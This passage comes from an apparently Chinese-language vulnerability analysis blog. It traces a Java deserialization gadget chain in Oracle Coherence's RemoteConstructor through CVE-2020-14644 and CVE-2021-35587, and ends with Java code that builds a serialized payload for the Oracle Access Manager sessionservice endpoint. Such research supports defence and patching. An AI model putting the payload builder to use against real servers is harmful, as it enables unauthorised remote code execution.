</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-27>27</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//com.tangosol.internal.util.invoke.RemoteConstructor
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>readResolve</span><span style=color:#f92672>()</span> <span style=color:#66d9ef>throws</span> ObjectStreamException <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> T <span style=color:#a6e22e>newInstance</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    RemotableSupport support <span style=color:#f92672>=</span> RemotableSupport<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getClassLoader</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> support<span style=color:#f92672>.</span><span style=color:#a6e22e>realize</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//com.tangosol.internal.util.invoke.RemotableSupport
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>public</span> <span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> T <span style=color:#a6e22e>realize</span><span style=color:#f92672>(</span>RemoteConstructor<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> constructor<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    ClassDefinition definition <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>registerIfAbsent</span><span style=color:#f92672>(</span>constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefinition</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> Remotable<span style=color:#f92672>&gt;</span> clz <span style=color:#f92672>=</span> definition<span style=color:#f92672>.</span><span style=color:#a6e22e>getRemotableClass</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>clz <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>synchronized</span><span style=color:#f92672>(</span>definition<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            clz <span style=color:#f92672>=</span> definition<span style=color:#f92672>.</span><span style=color:#a6e22e>getRemotableClass</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>clz <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                definition<span style=color:#f92672>.</span><span style=color:#a6e22e>setRemotableClass</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>defineClass</span><span style=color:#f92672>(</span>definition<span style=color:#f92672>));</span> <span style=color:#75715e>//最终的Sink点
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Remotable<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> instance <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Remotable<span style=color:#f92672>)</span>definition<span style=color:#f92672>.</span><span style=color:#a6e22e>createInstance</span><span style=color:#f92672>(</span>constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>getArguments</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    instance<span style=color:#f92672>.</span><span style=color:#a6e22e>setRemoteConstructor</span><span style=color:#f92672>(</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> instance<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=反射调用readresolve>反射调用readResolve<a hidden class=anchor aria-hidden=true href=#反射调用readresolve>#</a></h5><p><img loading=lazy src=image-20220713184804915.png alt=image-20220713184804915></p><p>反射调用obj对象的readResolve方法</p><p><img loading=lazy src=image-20220713184953973.png alt=image-20220713184953973></p><p>跟入调用</p><p><img loading=lazy src=image-20220713185148324.png alt=image-20220713185148324></p><p>调用到native层</p><p><img loading=lazy src=image-20220713185359355.png alt=image-20220713185359355></p><h5 id=sink点>sink点<a hidden class=anchor aria-hidden=true href=#sink点>#</a></h5><p>然后来到了 <code>com.tangosol.internal.util.invoke.RemoteConstructor#readResolve</code></p><p><img loading=lazy src=image-20220713185731806.png alt=image-20220713185731806></p><p>进入到 <code>com.tangosol.internal.util.invoke.RemotableSupport#realize</code></p><p><img loading=lazy src=image-20220713185818104.png alt=image-20220713185818104></p><h5 id=创建恶意类defineclass>创建恶意类：defineClass<a hidden class=anchor aria-hidden=true href=#创建恶意类defineclass>#</a></h5><p>需要注意的是我们的touch文件的操作在第64行的defineClass并没有执行，虽然看起来很像。</p><p>这一行实际上做的事情就是根据definition的字节码在内存中创建类定义，然后通过setRemotableClass给m_clz和m_mhCtor赋值，还不涉及字节码对应的类的实例化和构造函数的执行。</p><p>第64行执行前：</p><p><img loading=lazy src=image-20220713200544155.png alt=image-20220713200544155></p><p>第64行执行后：</p><p><img loading=lazy src=image-20220713200651318.png alt=image-20220713200651318></p><p>跟进查看defineClass如何起作用？</p><p>第83行对类名做了替换</p><p><img loading=lazy src=image-20220713201158026.png alt=image-20220713201158026></p><p>这是因为创建ClassIdentity的时候做了替换</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-61-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-61-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-61-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-61-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-61-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-61-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-61-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-61-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//com.tangosol.internal.util.invoke.ClassIdentity
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>public</span> <span style=color:#a6e22e>ClassIdentity</span><span style=color:#f92672>(</span>Class<span style=color:#f92672>&lt;?&gt;</span> clazz<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>(</span>clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>getPackage</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>().</span><span style=color:#a6e22e>replace</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#39;.&#39;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>),</span> clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>().</span><span style=color:#a6e22e>substring</span><span style=color:#f92672>(</span>clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>().</span><span style=color:#a6e22e>lastIndexOf</span><span style=color:#f92672>(</span><span style=color:#ae81ff>46</span><span style=color:#f92672>)</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>),</span> Base<span style=color:#f92672>.</span><span style=color:#a6e22e>toHex</span><span style=color:#f92672>(</span>md5<span style=color:#f92672>(</span>clazz<span style=color:#f92672>)));</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>跟进defineClass，最终会来到</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-62-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-62-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ClassLoader</span><span style=color:#960050;background-color:#1e0010>#</span>defineClass<span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>String</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[],</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>,</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ProtectionDomain</span><span style=color:#f92672>)</span>
</span></span></code></pre></td></tr></table></div></div><p>其中的defineClass1是native代码了</p><p><img loading=lazy src=image-20220713202547432.png alt=image-20220713202547432></p><p><img loading=lazy src=image-20220713202618096.png alt=image-20220713202618096></p><h5 id=实例化恶意类createinstance>实例化恶意类：createInstance<a hidden class=anchor aria-hidden=true href=#实例化恶意类createinstance>#</a></h5><p>真正的sink点在createInstance：</p><p><img loading=lazy src=image-20220713191543468.png alt=image-20220713191543468></p><p>获取test7的构造函数并调用</p><p><img loading=lazy src=image-20220713191749943.png alt=image-20220713191749943></p><p>调用到native代码</p><p><img loading=lazy src=image-20220713192142582.png alt=image-20220713192142582></p><p>这里不知为何没有走到 java.lang.invoke.MethodHandle#invokeExact</p><p><img loading=lazy src=image-20220713192840418.png alt=image-20220713192840418></p><p>而是走到了 java.lang.invoke.Invokers#checkExactType，并且调用栈经过了一处 java.lang.invoke.LambdaForm#LambdaForm 暂时没搞懂是什么魔法。</p><p><img loading=lazy src=image-20220713192944938.png alt=image-20220713192944938></p><p>然后跳转到 LambdaForm ，走到 java.lang.invoke.Invokers#checkCustomized</p><p><img loading=lazy src=image-20220713193314126.png alt=image-20220713193314126></p><p>然后跳转到 LambdaForm ，走到 java.lang.invoke.MethodHandleImpl#checkSpreadArgument</p><p><img loading=lazy src=image-20220713193421651.png alt=image-20220713193421651></p><p>然后跳转到 LambdaForm ，走到 java.lang.invoke.Invokers#checkGenericType</p><p><img loading=lazy src=image-20220713193532967.png alt=image-20220713193532967></p><p>然后跳转到 LambdaForm ，又走到 java.lang.invoke.Invokers#checkCustomized</p><p>然后跳转到 LambdaForm，走到 java.lang.invoke.DirectMethodHandle#allocateInstance</p><p><img loading=lazy src=image-20220713193812779.png alt=image-20220713193812779></p><p>sun.misc.Unsafe#allocateInstance定义如下</p><p><img loading=lazy src=image-20220713193927133.png alt=image-20220713193927133></p><p>根据描述，allocateInstance这个native函数只是创建一个实例，但没有执行任何构造函数。也确实观察到，到这里为止我们的touch文件的操作都还是没有发生。</p><p>又经过一个魔法般的LambdaForm跳转，我们来到了 java.lang.invoke.DirectMethodHandle#constructorMethod</p><p><img loading=lazy src=image-20220713194159162.png alt=image-20220713194159162></p><h5 id=执行构造函数恶意代码>执行构造函数（恶意代码）<a hidden class=anchor aria-hidden=true href=#执行构造函数恶意代码>#</a></h5><p>又一次不知道怎么发生的LambdaForm跳转之后，我们来到了test7的构造函数。</p><p><img loading=lazy src=image-20220713194252353.png alt=image-20220713194252353></p><p>此时完整的调用栈如下</p><p><img loading=lazy src=image-20220713194738012.png alt=image-20220713194738012></p><p>至此我们就完成了整个gadget的跟踪。</p><h5 id=返回创建的对象>返回创建的对象<a hidden class=anchor aria-hidden=true href=#返回创建的对象>#</a></h5><p>回到最开始的地方，将obj替换为rep</p><p><img loading=lazy src=image-20220713195827024.png alt=image-20220713195827024></p><p>这里check为null</p><p><img loading=lazy src=image-20220713195933608.png alt=image-20220713195933608></p><p>直接返回rep对象作为最终结果。</p><h3 id=构造payload>构造payload<a hidden class=anchor aria-hidden=true href=#构造payload>#</a></h3><h3 id=直接使用gadgetclassnotfoundexception>直接使用gadget：ClassNotFoundException<a hidden class=anchor aria-hidden=true href=#直接使用gadgetclassnotfoundexception>#</a></h3><p>将CVE-2020-14644的这条gadget的序列化数据封装成接口 <code>/oam/server/opensso/sessionservice</code> 能够处理的数据：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-17>17</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cve_2020_14644</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassIdentity classIdentity <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassIdentity<span style=color:#f92672>(</span>test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        CtClass ctClass <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>+</span> classIdentity<span style=color:#f92672>.</span><span style=color:#a6e22e>getVersion</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            String sobj <span style=color:#f92672>=</span> oamserialize<span style=color:#f92672>(</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>sobj<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>进入到readOrdinaryObject()</p><p><img loading=lazy src=image-20220714101700984.png alt=image-20220714101700984></p><p>isInstantiable()返回false</p><p><img loading=lazy src=image-20220714103354981.png alt=image-20220714103354981></p><p>这个方法在1.）类是externalizable 的且有public的无参构造器2.）类是non-externalizable且第一个不可序列化父类有可访问的无参构造器时返回true，其余时候返回false。</p><p>externalizable和serializable的区别：简单来说，前者可以保存对象的全部或一部分的状态，过程完全由程序逻辑控制，后者必须全部保存，过程由JVM完全控制。</p><blockquote><p><strong>The process of writing the state of an object to a file is called serialization</strong>, but strictly speaking, it is the process of converting an object from java supported form into a file-supported form or network-supported form by using fileOutputStream and objectOutputStream classes we can implement serialization.</p><p>But we can serialize only serializable objects. An object is said to be serializable if and only if the corresponding class implements a Serializable interface. Serializable interface is present in java.io package, and it doesn’t contain any method and hence it is a marker interface. If we are trying to serializable a non-serializable object then we will get Runtime Exception saying notSerializableException.</p><p>&mldr;</p><p><strong>In serialization, everything is taken care of by JVM and the programmer doesn’t have any control.</strong> In serialization, it is always possible to solve the total object to file, and <strong>it is not possible to save part of the object</strong> which may create performance problems. To overcome this problem we should go for externalization.</p><p>The main advantage of Externalizable over serialization is, <strong>everything is taken care of by the programmer and JVM doesn’t have any control.</strong> Based on our requirements <strong>we can save either the total object or part of the object</strong> which improves the performance of the system. To provide the generalizable ability for any java object, it’s a mandate for the corresponding class to implement a generalizable interface.</p><p>&mldr;</p><p>——https://www.geeksforgeeks.org/difference-between-serializable-and-externalizable-in-java-serialization/</p></blockquote><p>可以看到这是一个non-externalizable的类，而com.tangosol.internal.util.invoke.RemoteConstructor是有无参构造器的，那么为什么会返回false呢？</p><p><img loading=lazy src=image-20220714110447494.png alt=image-20220714110447494></p><p>对比CVE-2020-14644的ObjectStreamClass对象desc和CVE-2021-35587的desc</p><p>后者没有找到构造器cons</p><p><img loading=lazy src=image-20220714115825664.png alt=image-20220714115825664></p><p>前者有</p><p><img loading=lazy src=image-20220714115911777.png alt=image-20220714115911777></p><p>所以后者的isInstantiable()返回了false。</p><p>至于为什么两种环境下识别到的cons不同，让我们跟入 <code>java.io.ObjectInputStream#readClassDesc</code> 对比一下。</p><p>会进入到readNonProxyDesc(boolean unshared)</p><p><img loading=lazy src=image-20220714111616759.png alt=image-20220714111616759></p><p><img loading=lazy src=image-20220714141606125.png alt=image-20220714141606125></p><p><img loading=lazy src=image-20220714141709907.png alt=image-20220714141709907></p><p>weblogic环境下，ClassLoader是 sun.misc.Launcher.AppClassLoader#AppClassLoader，加载了134个类</p><p><img loading=lazy src=image-20220714142930193.png alt=image-20220714142930193></p><p><code>class com.tangosol.internal.util.invoke.RemoteConstructor</code> 就在其中</p><p><img loading=lazy src=image-20220714143114667.png alt=image-20220714143114667></p><p>执行以下代码确认存在</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>Iterator iterator<span style=color:#f92672>=</span>latestUserDefinedLoader<span style=color:#f92672>().</span><span style=color:#a6e22e>classes</span><span style=color:#f92672>.</span><span style=color:#a6e22e>iterator</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>String res<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span><span style=color:#f92672>(</span>iterator<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>iterator<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>().</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>().</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;class com.tangosol.internal.util.invoke.RemoteConstructor&#34;</span><span style=color:#f92672>))</span>res<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;exist&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>res
